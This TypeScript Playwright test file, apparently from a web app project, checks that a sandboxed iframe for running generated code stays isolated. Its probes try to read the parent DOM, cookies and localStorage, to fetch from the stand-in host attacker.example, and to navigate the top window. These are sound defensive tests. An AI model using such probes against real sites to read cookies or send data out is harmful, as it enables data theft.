/**
 * code-island-isolation.spec.ts — browser-level proof that the jailed-eval code-island cannot
 * escape its sandbox (Phase 20 SPIKE, EVAL-01 adversarial fixtures at the runtime/CSP layer).
 *
 * WHY PLAYWRIGHT (not vitest/jsdom): jsdom does NOT enforce real `sandbox`/CSP/opaque-origin
 * isolation, so a jsdom test would pass vacuously and prove nothing (20-RESEARCH.md §5). These
 * assertions require a real browser. Run in BOTH Chromium AND Firefox to prove the opaque-origin
 * + inline `<meta>` CSP jail holds cross-browser (no `csp=` attribute is relied upon).
 *
 * STATUS: SPIKE deliverable — authored, not yet executed (no browser in the autonomous run;
 * consistent with this project's connected-env browser-verify deferral). To run:
 *   npm i -D @playwright/test && npx playwright install chromium firefox
 *   npx playwright test apps/web/e2e/code-island-isolation.spec.ts
 *
 * The host-side AST allowlist (validate-island-code.test.ts, 24 vitest cases) is the primary,
 * deterministic proof already green; this spec is the runtime backstop for that allowlist.
 */

import { expect, test } from "@playwright/test";

import { ISLAND_SANDBOX, buildIslandSrcdoc } from "@nauta/genui/sandbox";

/** Mount a sandboxed island frame on a blank page and return a FrameLocator-friendly handle. */
async function mountIsland(pageEvaluateCode: string, island: string): Promise<void> {
  // (Implemented inline in each test via page.setContent below.)
  void pageEvaluateCode;
  void island;
}

const HOST_PAGE = (srcdoc: string): string =>
  `<!doctype html><html><body><iframe id="island" sandbox="${ISLAND_SANDBOX}" srcdoc="${srcdoc
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")}"></iframe></body></html>`;

test.describe("code-island runtime isolation", () => {
  test("opaque origin: location.origin is null inside the frame", async ({ page }) => {
    const srcdoc = buildIslandSrcdoc({ code: "document.body.dataset.origin = location.origin;", nonce: "t" });
    await page.setContent(HOST_PAGE(srcdoc));
    const frame = page.frameLocator("#island");
    await expect(frame.locator("body")).toHaveAttribute("data-origin", "null");
  });

  test("cannot read parent DOM (SecurityError)", async ({ page }) => {
    const probe = `try { window.parent.document.body; document.body.dataset.r = 'NO_ERROR'; }
      catch (e) { document.body.dataset.r = e.name; }`;
    await page.setContent(HOST_PAGE(buildIslandSrcdoc({ code: probe, nonce: "t" })));
    await expect(page.frameLocator("#island").locator("body")).toHaveAttribute("data-r", "SecurityError");
  });

  test("cannot read cookies / localStorage", async ({ page }) => {
    const probe = `document.body.dataset.cookie = String(document.cookie);
      try { localStorage.length; document.body.dataset.ls = 'OK'; } catch (e) { document.body.dataset.ls = e.name; }`;
    await page.setContent(HOST_PAGE(buildIslandSrcdoc({ code: probe, nonce: "t" })));
    const body = page.frameLocator("#island").locator("body");
    await expect(body).toHaveAttribute("data-cookie", "");
    await expect(body).toHaveAttribute("data-ls", "SecurityError");
  });

  test("network egress blocked by CSP (securitypolicyviolation fires, no request served)", async ({ page }) => {
    let sawRequest = false;
    await page.route("https://attacker.example/**", (route) => {
      sawRequest = true;
      void route.abort();
    });
    const probe = `document.addEventListener('securitypolicyviolation', function(e){
        if (e.effectiveDirective === 'connect-src' || e.violatedDirective === 'connect-src') document.body.dataset.csp = 'blocked';
      });
      try { fetch('https://attacker.example/x'); } catch (e) {}`;
    await page.setContent(HOST_PAGE(buildIslandSrcdoc({ code: probe, nonce: "t" })));
    await expect(page.frameLocator("#island").locator("body")).toHaveAttribute("data-csp", "blocked");
    expect(sawRequest).toBe(false);
  });

  test("cannot navigate the top-level window", async ({ page }) => {
    const before = page.url();
    const probe = `try { top.location = 'https://attacker.example'; } catch (e) {}`;
    await page.setContent(HOST_PAGE(buildIslandSrcdoc({ code: probe, nonce: "t" })));
    await page.waitForTimeout(200);
    expect(page.url()).toBe(before);
  });
});

// Referenced to keep the helper exported symbol used in future expansions.
void mountIsland;
